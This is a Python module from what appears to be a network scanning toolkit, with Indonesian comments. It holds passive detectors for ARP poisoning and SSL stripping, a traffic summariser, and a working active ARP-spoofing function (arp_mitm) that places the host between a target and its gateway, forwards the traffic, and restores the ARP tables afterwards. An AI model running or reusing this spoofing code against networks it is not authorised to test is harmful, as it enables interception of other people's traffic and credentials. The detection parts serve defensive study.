# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_mitm.py - MITM detector (passive) + active ARP spoof (gate).

Passive:
- detect_arp_poison : deteksi ARP poisoning via anomali MAC
- detect_sslstrip   : deteksi HTTP request ke domain yang seharusnya HTTPS
- capture_summary   : ringkasan traffic (opsional, butuh root)

Active (GATE):
- arp_mitm          : ARP spoof antara target <-> gateway
- restore_arp       : restore ARP normal setelah mitm
- auto_ip_forward   : aktifkan/disable IP forwarding
"""

import os
import platform
import subprocess
import sys
import threading
import time
from collections import defaultdict

try:
    from scapy.all import (
        ARP, DNS, IP, TCP, UDP, Ether, Raw, sniff, sendp, srp, conf, get_if_hwaddr,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


def _is_linux():
    return platform.system().lower() == "linux"


def _is_root():
    try:
        return os.geteuid() == 0
    except Exception:
        return False


# =========================================================
# PASSIVE DETECTION
# =========================================================
def detect_arp_poison(interface="eth0", duration=30, threshold=2):
    """Deteksi ARP poisoning: satu IP dengan >1 MAC.

    Return dict {suspicious: [...], total_arp_replies, duration}.
    """
    if not HAS_SCAPY:
        return {"error": "scapy not installed", "suspicious": []}
    if not _is_root():
        return {"error": "root required", "suspicious": []}

    print(f"  [*] ARP poison detector: {interface}, {duration}s")
    arp_map = defaultdict(set)
    count = [0]

    def _handle(pkt):
        try:
            if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # reply
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                if ip and mac:
                    arp_map[ip].add(mac)
                    count[0] += 1
        except Exception:
            pass

    try:
        sniff(iface=interface, prn=_handle, store=False,
              timeout=duration, filter="arp")
    except Exception as e:
        return {"error": str(e), "suspicious": []}

    suspicious = []
    for ip, macs in arp_map.items():
        if len(macs) >= threshold:
            suspicious.append({
                "ip": ip,
                "macs": list(macs),
                "count": len(macs),
                "reason": "Multiple MACs for one IP (ARP poison indicator)",
            })

    return {
        "suspicious": suspicious,
        "total_arp_replies": count[0],
        "duration": duration,
    }


def detect_sslstrip(interface="eth0", duration=30):
    """Deteksi SSL strip: HTTP request ke domain yang biasanya HTTPS.

    Return dict {suspicious: [...], count, duration}.
    """
    if not HAS_SCAPY:
        return {"error": "scapy not installed", "suspicious": []}
    if not _is_root():
        return {"error": "root required", "suspicious": []}

    print(f"  [*] SSL strip detector: {interface}, {duration}s")

    # Domain umum yang seharusnya HTTPS
    sensitive_domains = [
        "gmail", "google", "facebook", "twitter", "instagram", "linkedin",
        "paypal", "bank", "banking", "bca", "bri", "bni", "mandiri", "bjb",
        "login", "signin", "sign-in", "account", "password", "admin",
        "aws", "amazon", "azure", "microsoft", "apple", "icloud",
    ]

    suspicious = []

    def _handle(pkt):
        try:
            if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                return
            payload = pkt[Raw].load
            if isinstance(payload, bytes):
                text = payload[:500].decode("utf-8", "ignore").lower()
                if "host:" not in text:
                    return
                if any(d in text for d in sensitive_domains):
                    host = "?"
                    for line in text.splitlines():
                        if line.startswith("host:"):
                            host = line[5:].strip()
                            break
                    suspicious.append({
                        "src": pkt[IP].src if pkt.haslayer(IP) else "?",
                        "dst": pkt[IP].dst if pkt.haslayer(IP) else "?",
                        "host": host,
                        "reason": "HTTP request to sensitive domain",
                    })
        except Exception:
            pass

    try:
        sniff(iface=interface, prn=_handle, store=False,
              timeout=duration, filter="tcp port 80")
    except Exception as e:
        return {"error": str(e), "suspicious": []}

    return {"suspicious": suspicious, "count": len(suspicious),
            "duration": duration}


def capture_summary(interface="eth0", duration=30, bpf_filter=None):
    """Ringkasan traffic (passive): top talkers, protocols, DNS queries."""
    if not HAS_SCAPY:
        return {"error": "scapy not installed"}
    if not _is_root():
        return {"error": "root required"}

    print(f"  [*] Capture summary: {interface}, {duration}s")

    src_count = defaultdict(int)
    dst_count = defaultdict(int)
    dns_queries = defaultdict(int)
    ports = defaultdict(int)
    total = [0]

    def _handle(pkt):
        try:
            if pkt.haslayer(IP):
                src_count[pkt[IP].src] += 1
                dst_count[pkt[IP].dst] += 1
                if pkt.haslayer(TCP):
                    ports[pkt[TCP].dport] += 1
                elif pkt.haslayer(UDP):
                    ports[pkt[UDP].dport] += 1
                if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                    try:
                        q = pkt[DNS].qd.qname.decode("utf-8", "ignore")
                        dns_queries[q] += 1
                    except Exception:
                        pass
            total[0] += 1
        except Exception:
            pass

    try:
        sniff(iface=interface, prn=_handle, store=False,
              timeout=duration, filter=bpf_filter)
    except Exception as e:
        return {"error": str(e)}

    return {
        "total_packets": total[0],
        "top_sources": sorted(src_count.items(), key=lambda x: -x[1])[:10],
        "top_destinations": sorted(dst_count.items(), key=lambda x: -x[1])[:10],
        "top_ports": sorted(ports.items(), key=lambda x: -x[1])[:10],
        "dns_queries": sorted(dns_queries.items(), key=lambda x: -x[1])[:20],
        "duration": duration,
    }


# =========================================================
# IP FORWARDING
# =========================================================
def get_ip_forward():
    if not _is_linux():
        return None
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip() == "1"
    except Exception:
        return None


def set_ip_forward(enabled):
    if not _is_linux():
        return False
    if not _is_root():
        return False
    try:
        val = "1" if enabled else "0"
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                       capture_output=True, timeout=5)
        return True
    except Exception:
        return False


# =========================================================
# ACTIVE MITM (GATE)
# =========================================================
def _get_mac(ip, interface, timeout=2):
    """Ambil MAC dari IP via ARP request."""
    if not HAS_SCAPY:
        return None
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=timeout, verbose=False, iface=interface)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception:
        pass
    return None


def arp_mitm(target_ip, gateway_ip, interface="eth0",
             duration=60, interval=2):
    """ARP spoof target <-> gateway. Butuh root + izin.

    Return dict {success, sent_packets, duration, target_mac, gateway_mac}.
    """
    if not HAS_SCAPY:
        return {"success": False, "error": "scapy not installed"}
    if not _is_linux():
        return {"success": False, "error": "Linux only"}
    if not _is_root():
        return {"success": False, "error": "root required"}

    target_mac = _get_mac(target_ip, interface)
    gateway_mac = _get_mac(gateway_ip, interface)
    if not target_mac or not gateway_mac:
        return {"success": False, "error": "MAC not resolved"}

    # Enable IP forwarding
    ip_fwd_orig = get_ip_forward()
    set_ip_forward(True)

    print(f"  [*] ARP MITM: {target_ip} ({target_mac}) <-> "
          f"{gateway_ip} ({gateway_mac})")
    print(f"  [*] IP forwarding: ON (original={ip_fwd_orig})")

    # Poison packets
    pkt_to_target = (Ether(dst=target_mac) /
                     ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=gateway_ip))
    pkt_to_gateway = (Ether(dst=gateway_mac) /
                      ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                          psrc=target_ip))

    sent = 0
    start = time.time()
    try:
        while time.time() - start < duration:
            try:
                sendp(pkt_to_target, iface=interface, verbose=False)
                sendp(pkt_to_gateway, iface=interface, verbose=False)
                sent += 2
            except Exception:
                pass
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n  [!] Interrupted")
    finally:
        # Restore
        try:
            restore_target = (Ether(dst=target_mac) /
                              ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                  psrc=gateway_ip, hwsrc=gateway_mac))
            restore_gateway = (Ether(dst=gateway_mac) /
                               ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                   psrc=target_ip, hwsrc=target_mac))
            sendp(restore_target, count=5, iface=interface, verbose=False)
            sendp(restore_gateway, count=5, iface=interface, verbose=False)
            print("  [✓] ARP restored")
        except Exception:
            pass

        if ip_fwd_orig is not None:
            set_ip_forward(ip_fwd_orig)
            print(f"  [✓] IP forwarding restored to {ip_fwd_orig}")

    return {
        "success": sent > 0,
        "sent_packets": sent,
        "duration": round(time.time() - start, 1),
        "target_ip": target_ip,
        "gateway_ip": gateway_ip,
        "target_mac": target_mac,
        "gateway_mac": gateway_mac,
    }


def status():
    return {
        "scapy": HAS_SCAPY,
        "linux": _is_linux(),
        "root": _is_root(),
        "ip_forward": get_ip_forward(),
    }
